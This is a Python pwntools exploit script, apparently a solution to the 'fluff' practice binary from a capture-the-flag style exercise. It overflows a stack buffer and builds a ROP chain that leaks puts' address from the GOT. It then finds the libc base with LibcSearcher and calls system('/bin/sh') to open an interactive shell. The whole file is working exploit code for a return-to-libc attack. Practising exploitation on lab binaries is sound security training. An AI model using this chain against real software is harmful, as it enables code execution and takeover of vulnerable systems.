from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
p = process("./fluff")
elf = ELF("./fluff")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
pop_rdi = 0x4008c3
pwnme = elf.sym["pwnme"]

payload = "a" * 0x20 + "b" * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(pwnme)
p.recvuntil("> ")
p.sendline(payload)

puts_addr = u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00"))
libc = LibcSearcher("puts" , puts_addr)
libc_base = puts_addr - libc.dump("puts")
str_bin_sh = libc_base + libc.dump("str_bin_sh")
system = libc_base + libc.dump("system")

payload2 = "a" * 0x20 + "b" * 8 + p64(pop_rdi) + p64(str_bin_sh) + p64(system)   
p.sendline(payload2)

p.interactive()
